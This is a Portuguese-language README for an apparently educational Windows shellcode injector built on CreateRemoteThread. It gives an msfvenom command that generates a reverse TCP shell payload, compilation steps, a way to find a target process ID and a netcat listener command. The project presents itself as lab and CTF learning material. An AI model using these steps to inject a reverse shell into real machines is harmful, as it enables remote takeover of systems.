# 💉 Remote Shellcode Injector (Windows)

Este é um código **básico e educacional** para realizar **injeção de shellcode em um processo remoto no Windows** utilizando a função `CreateRemoteThread`.

> ⚠️ **Aviso:** Este projeto **não possui técnicas de evasão de antivírus, EDR ou outros mecanismos de defesa**. É voltado exclusivamente para fins de **teste em ambientes controlados**, como laboratórios de malware analysis, CTFs, máquinas virtuais isoladas ou para aprendizado.

---

## 🧠 Objetivo

Demonstrar o funcionamento da técnica de injeção clássica via:

- `OpenProcess`
- `VirtualAllocEx`
- `WriteProcessMemory`
- `CreateRemoteThread`

Este código injeta um shellcode pré-definido (por padrão, um **reverse shell TCP**) em um processo remoto identificado por seu **PID**.

---

## ⚙️ Uso

🧪 Requisitos
Sistema: Windows (x64)
Permissões de administrador (recomendado)
Ambiente controlado (máquina virtual, laboratório)


## Gere o shellcode no msfvenom --> msfvenom -p windows/x64/shell_reverse_tcp LHOST=SEU_IP LPORT=SUA_PORTA -f c
 
Substitua o conteúdo da variável payload[] no código-fonte com o novo shellcode.

## 🏗️ Compilação

Você pode compilar o código com o `gcc` do MinGW (modo 64 bits):

`x86_64-w64-mingw32-gcc injector.c -o injector.exe`


🧪 Processo de Teste

Para testar a injeção de shellcode com segurança, você pode usar o seguinte programa simples como alvo:

Código do processo de teste (dummy_process.c).

## COMPILE O CODIGO 

`x86_64-w64-mingw32-gcc dummy_process.c -o dummy_process.exe`

Execute o código : dummy_process.exe

Em outro terminal use : `tasklist | findstr dummy_process.exe`

--> Pegue esse PID e execute o código code.exe <PID>

### !! IMPORTANTE 
-> Não se esqueça de abrir o shell na sua maquina . ex: nc -vlp 8080 


